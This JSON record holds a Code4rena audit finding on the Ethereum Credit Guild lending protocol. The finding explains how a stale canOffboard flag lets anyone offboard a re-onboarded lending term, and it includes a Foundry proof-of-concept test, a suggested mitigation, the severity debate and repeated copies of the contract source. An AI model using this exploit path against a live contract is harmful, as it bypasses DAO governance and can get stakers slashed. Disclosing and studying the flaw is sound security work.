{
  "Title": "[M-05] Replay attack to suddenly offboard the re-onboarded lending term",
  "Content": "\nThe `LendingTermOffboarding` contract allows guild holders to poll to remove a lending term. If the voting weight is enough, the lending term can be offboarded without delay. Further, the offboarded term can be re-onboarded to become an active term through the `LendingTermOnboarding::proposeOnboard()` following up with the voting mechanism.\n\nThe following briefly describes the steps for offboarding the lending term through the `LendingTermOffboarding` contract:\n\n1. Anyone executes the `proposeOffboard()` to create a poll for offboarding the term. The poll has an age of `~7 days`.\n2. Guild holders cast votes for offboarding the term via `supportOffboard()`.\n3. If the poll has not ended and the voting weight is enough, the `canOffboard[term]` flag will be set.\n4. If the `canOffboard[term]` flag is set; anyone can execute the `offboard()` to offboard the term.\n5. All loans of the offboarded term have to be called and closed.\n6. After all loans have been closed, the `cleanup()` can be invoked to explicitly terminate the term and reset the `canOffboard[term]` flag.\n\nThe following roughly describes the steps for re-onboarding the offboarded lending term through the `LendingTermOnboarding` contract:\n\n1. The offboarded term can be proposed for re-onboarding through the `proposeOnboard()`.\n2. Guild holders cast votes for the term.\n3. If the vote is successful, the term re-onboarding operation is queued in the Timelock.\n4. After the Timelock delay, the term can be re-onboarded to become an active lending term again.\n\n### Vulnerability Details\n\nThis report describes the vulnerability in the `LendingTermOffboarding` contract, allowing an attacker to force the re-onboarded lending term to offboard by overriding the DAO vote offboarding mechanism. In other words, the attacker is not required to create an offboarding poll and wait for the vote to succeed in offboarding the target term. Furthermore, the attacker is not required to possess any guild tokens.\n\nThe following explains the attack steps:\n\n1. As per steps 1 - 4 for offboarding the lending term previously described above, the [`canOffboard[term]` flag will be set](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140) by the `supportOffboard()`, and the [lending term will be offboarded](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154) via the `offboard()`.\n2. To explicitly terminate the term (via the `cleanup()`), all loans issued must be [called and closed](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L177-L180). Therefore, there will be a time gap waiting for all loans to be closed in this step.\n3. Assuming that while waiting for all loans to be closed, the offboarded term has been proposed and successfully granted for re-onboarding (see steps 1 - 4 previously described above for re-onboarding the offboarded lending term).\n4. After the previous step, the term has become re-onboarded (active) for issuing new loans. Notice that the term was re-onboarded without executing the `cleanup()`. Thus, the `canOffboard[term]` flag is still active.\n5. For this reason, the attacker can [execute the `offboard()`](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154) to force offboarding the re-onboarded term, overriding the DAO vote offboarding mechanism (since the `canOffboard[term]` flag is still active).\n\nThe attacker can suddenly offboard the re-onboarded term whenever they will, regardless of how long the target term has been re-onboarded, how long the offboarding poll has expired, or how long the `canOffboard[term]` flag has been activated (please refer to the `Proof of Concept` section for the coded PoC).\n\nFurthermore, the attacker does not need to hold guild tokens to exploit this vulnerability:\n\n```solidity\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n@1      if (_weight + userWeight >= quorum) {\n@1          canOffboard[term] = true; //@audit -- Once the voting weight is enough, the canOffboard[term] flag will be set\n@1      }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    function offboard(address term) external whenNotPaused {\n@2      require(canOffboard[term], \"LendingTermOffboarding: quorum not met\"); //@audit -- If the canOffboard[term] flag is set, the term can be offboarded\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n@3      require(\n@3          LendingTerm(term).issuance() == 0, //@audit -- To clean up the term, all its loans must be closed\n@3          \"LendingTermOffboarding: not all loans closed\"\n@3      );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n```\n\n`@1 - Once the voting weight is enough, the canOffboard[term] flag will be set`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140>).\n\n`@2 - If the canOffboard[term] flag is set, the term can be offboarded`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154>).\n\n`@3 - To clean up the term, all its loans must be closed`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L177-L180>).\n\n### Impact\n\nThe active re-onboarded lending term can be forced to immediately offboard, bypassing the DAO vote offboarding, which is the protocol's core mechanism. Subsequently, the attacked lending term will block all new loans from being issued and prevent guild holders from voting for the term.\n\nMoreover, all loans previously issued by the attacked term can be called putting the loans for bidding silently (since the attacker bypasses the DAO vote offboarding mechanism). If one of the loans fails on bidding to fill up the loan's principal, the [term's loss will be notified](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L797). As a result, all users who stake credit tokens through the `SurplusGuildMinter` contract to vote for the attacked term will [be slashed with all their credit principal and guild rewards](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L231).\n\n### Proof of Concept\n\nPlace the `testPoCReplayOffboarding()` in the `.test/unit/governance/LendingTermOffboarding.t.sol` file and run the test using the `forge test --match-test testPoCReplayOffboarding -vvv` command:\n\n```solidity\nfunction testPoCReplayOffboarding() public {\n    // Prepare for Bob\n    guild.mint(bob, _QUORUM);\n    vm.startPrank(bob);\n    guild.delegate(bob);\n\n    uint256 POLL_DURATION_BLOCKS = offboarder.POLL_DURATION_BLOCKS();\n    uint256 snapshotBlock = block.number;\n    uint256 OFFBOARDING_POLL_END_BLOCK = snapshotBlock + POLL_DURATION_BLOCKS;\n\n    // Bob proposes an offboarding of the term\n    assertEq(guild.isGauge(address(term)), true);\n    offboarder.proposeOffboard(address(term));\n\n    // Next 1 day\n    vm.roll(block.number + 6646); // 1 day\n    vm.warp(block.timestamp + 6646 * 13);\n    assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);\n\n    vm.expectRevert(\"LendingTermOffboarding: quorum not met\");\n    offboarder.cleanup(address(term));\n\n    // Bob votes for offboarding the term and executes the offboarding (he has a sufficient voting weight)\n    assertEq(guild.isGauge(address(term)), true);\n    assertEq(offboarder.canOffboard(address(term)), false);\n    offboarder.supportOffboard(snapshotBlock, address(term));\n    offboarder.offboard(address(term));\n    assertEq(guild.isGauge(address(term)), false);\n    assertEq(offboarder.canOffboard(address(term)), true);\n\n    // Cannot clean up because loans are active\n    vm.expectRevert(\"LendingTermOffboarding: not all loans closed\");\n    offboarder.cleanup(address(term));\n\n    // ------------------------------------------------------------------------------ //\n    // ---<< Waiting for all term's loans to be closed to execute the cleanup() >>--- //\n    // ------------------------------------------------------------------------------ //\n\n    // Next 10 days\n    // Offboarding poll expired\n    vm.roll(block.number + 66460); // 10 days\n    vm.warp(block.timestamp + 66460 * 13);\n    assertGt(block.number, OFFBOARDING_POLL_END_BLOCK);\n\n    // While waiting for all term's loans to be closed, the term gets re-onboarded\n    vm.stopPrank();\n    assertEq(guild.isGauge(address(term)), false);\n    guild.addGauge(1, address(term));\n    assertEq(guild.isGauge(address(term)), true);\n\n    // The canOffboard[term] flag is still active since the cleanup() hasn't been called\n    assertEq(offboarder.canOffboard(address(term)), true);\n\n    // Next 30 days\n    vm.roll(block.number + 199380); // 30 days\n    vm.warp(block.timestamp + 199380 * 13);\n\n    // Attacker offboards the term by overriding the DAO vote offboarding mechanism\n    // The attacker did not need to hold any guild tokens to exploit this vulnerability\n    address Attacker = address(1);\n    vm.startPrank(Attacker);\n    assertEq(guild.isGauge(address(term)), true);\n    offboarder.offboard(address(term));\n    assertEq(guild.isGauge(address(term)), false);\n}\n```\n\n### Recommended Mitigation Steps\n\nImplement a proper mechanism for resetting the `canOffboard[term]` flag once the associated lending term has been re-onboarded.\n\nIt is worth noting that the `canOffboard[term]` flag should be reset after the term re-onboarding operation has successfully been executed by Timelock (when the term is already active) to prevent other security issues.\n\n**[eswak (Ethereum Credit Guild) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1147#issuecomment-1898022905):**\n> Confirming this, but disagree with severity. I think medium is more fit for this, given the unlikely situation of re-onboarding a term that just has been offboarded, and that no user funds are at risk.\n\n**[TrungOre (judge) decreased severity to Medium](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1147#issuecomment-1919132413)**\n\n**[serial-coder (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1147#issuecomment-1922864432):**\n> I disagree with the sponsor's and judge's statements.\n>\n> > **\"the unlikely situation of re-onboarding a term that just has been offboarded\"**\n> \n> The attack scenario described in this report does not rely on the situation that \"the term must be re-onboarded within only a few days after it has been offboarded\". Specifically, after the term is offboarded, there will be a time gap waiting for all loans to be called and closed in order to explicitly terminate the term via the `cleanup()` (to reset the `canOffboard[term]` flag). \n> \n> This time gap can be a long period (e.g., a couple of weeks/months). Before all loans are closed, the term can be proposed and granted for re-onboarding (the `canOffboard[term]` flag is still set to true).\n> \n> Then, the attacker can wait for a long period (e.g., a couple of months) before attacking. The coded PoC proves that the target term can be re-onboarded after being offboarded for 10 days (or even later), and the attacker can launch the attack operation (immediately offboard the target term) after the target term has re-onboarded for 30 days (or even later).\n> \n> > **\"no user funds are at risk\"**\n> \n> The attacker can wait for a long period before attacking (e.g., a couple of months -- *please thoroughly consider the coded PoC for the proof.*). In the meantime, after the target term has been re-onboarded, several GUILD holders can vote for it, and then the term can re-issue new loans.\n> \n> Once the attacker launches the attack operation, the target term will be forced to immediately offboard, bypassing the DAO vote offboarding. Clearly, the loan borrowers' funds and the stakers' funds are at risk.\n> \n> In other words, the attack will impact both borrowers (whose loans are forced to be called and closed maliciously) and stakers (who vote for the term via the `SurplusGuildMinter` contract will be slashed with all their CREDIT principal and GUILD rewards).\n> \n> The vulnerability also impacts the protocol by breaking the governance decision, which is a core feature of the protocol. For this reason, the HIGH severity is proper for this report.\n\n**[TrungOre (judge) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1147#issuecomment-1932410192):**\n > @serial-coder - I still believe its severity is medium, since the attacker still needs enough votes for re-onboarding before `cleanup()`. This malicious action is still preventable, by vetoing the onboarding proposal. Therefore, it should be considered as low likelihood with high cost.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1147).*\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-12-ethereumcreditguild",
  "Code": [
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not 